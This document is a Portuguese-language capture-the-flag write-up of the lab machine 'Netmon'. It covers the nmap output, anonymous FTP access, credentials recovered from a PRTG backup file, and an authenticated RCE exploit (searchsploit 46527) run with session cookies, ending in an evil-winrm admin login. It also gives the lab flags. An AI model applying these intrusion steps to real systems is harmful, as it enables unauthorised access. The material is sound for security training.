# Netmon WriteUp

## Scan and Enumeration

```textile
# Nmap 7.92 scan initiated Wed Dec 29 16:41:39 2021 as: nmap -A -Pn -p 21,80,135,139,445,5985,47001 -T5 -oN scan.txt 10.129.167.101
Nmap scan report for 10.129.167.101
Host is up (0.16s latency).

PORT      STATE SERVICE      VERSION
21/tcp    open  ftp          Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 02-02-19  11:18PM                 1024 .rnd
| 02-25-19  09:15PM       <DIR>          inetpub
| 07-16-16  08:18AM       <DIR>          PerfLogs
| 02-25-19  09:56PM       <DIR>          Program Files
| 02-02-19  11:28PM       <DIR>          Program Files (x86)
| 12-29-21  04:12PM       <DIR>          Users
|_02-25-19  10:49PM       <DIR>          Windows
80/tcp    open  http         Indy httpd 18.1.37.13946 (Paessler PRTG bandwidth monitor)
| http-title: Welcome | PRTG Network Monitor (NETMON)
|_Requested resource was /index.htm
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: PRTG/18.1.37.13946
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microsoft Windows 10 1511 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2021-12-29T21:41:59
|_  start_date: 2021-12-29T19:59:15

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   157.08 ms 10.10.14.1
2   157.13 ms 10.129.167.101

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 29 16:42:05 2021 -- 1 IP address (1 host up) scanned in 26.55 seconds
```

## Exploitation

Após ter feito a enumeração, podemos ver que o servidor possui o usuário `anonymous` habilitado no ftp. Podemos logar com o usuário anonymous e pegar a user flag que está localizado em `/Users/Public` .

Para isso, apenas precisamos entrar na pasta e usar o comando `mget` do ftp para baixar o aqruivo `user.txt` para nossa máquina.

* User Flag:

```
└─$ cat user.txt 
974f9047bc0a33bd547405fb10996218
```

Após ter pego a user flag, podemos enumerar o host para ver se conseguimos algo de interessante.

O host possui um `PRTG Network Monitor` na versão `18.1.37` rodando na porta 80. Ao pesquisar sobre vulnerabilidades nessa versão, conseguimos achar um RCE authenticated com exploit público, porém para conseguirmos exploitar o alvo, precisamos de credenciais de acesso.

Ao procurar as credenciais default e testá-las, não obtivemos sucesso. O que nos sobra é revirar os arquivos do ftp, para podermos encontrar algo.

Após um tempo enumerando, podemos ver que o arquivo `PRTG Configuration.old.bak` possui credenciais, porém incorretas. Se usarmos guessing e ir trocando os anos da senha, chegamos nas credenciais válidas `prtgadmin:PrTg@dmin2019` .

* Maneira fácil de encontrar essas credenciais:
1. Baixar a pasta **Users** para seu pc com o comando: wget -r `ftp://anonymous:anonymous@10.129.167.101/Users`.

2. Após baixar, acessar a pasta `10.129.167.101/Users/All Users/Paessler/PRTG Network Monitor` 

3. Usar o comando `cat PRTG\ Configuration.old.bak | grep -i user: -B2 -A2` para encontrar as credenciais antigas.

Foi usado o seguinte arquivo para entender onde são armezados credenciais do prtg: [How and where does PRTG store its data? | Paessler Knowledge Base](https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data)

## Privilege escalation

Tendo pego as credenciais corretas, podemos usar o comando `searchsploit prtg` para procurar por um exploit no prtg.

Após feito a pesquisa, podemos ver um exploit em sh que podemos baixar com `searchsploit -m 46527` .

Tendo o exploit em mãos, podemos executá-lo da maneira que é pedido e veremos que um usuário com privilégios administrativos será criado.

**Comando exploit:** `./46527.sh -u http://10.129.167.101 -c "_ga=GA1.4.1968055743.1640808238; _gid=GA1.4.717060946.1640808238; OCTOPUS1813713946=e0RFNjM5Q0Y0LTA3N0EtNEE3RS05OEUxLTc1NkM2NTQzM0EyNH0%3D"`

OBS: Os parâmetros de "-c" são os valores dos cookies de sessão que são pegos quando estamos logados com o usuário na aplicação.

Ao executar o exploit as seguintes credenciais nos são fornecidas `pentest:P3nT3st!` .

Tendo as credenciais administrativas, podemos logar no host usando o evil-winrm ou psexec.

**Comando login:** `evil-winrm -i 10.129.167.101 -u pentest -p 'P3nT3st!'`



* Root Flag:

```powershell
*Evil-WinRM* PS C:\Users\pentest\Documents> cd C:\Users\Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f77acf2aa48110fce560c6c16cc8c2d5
```
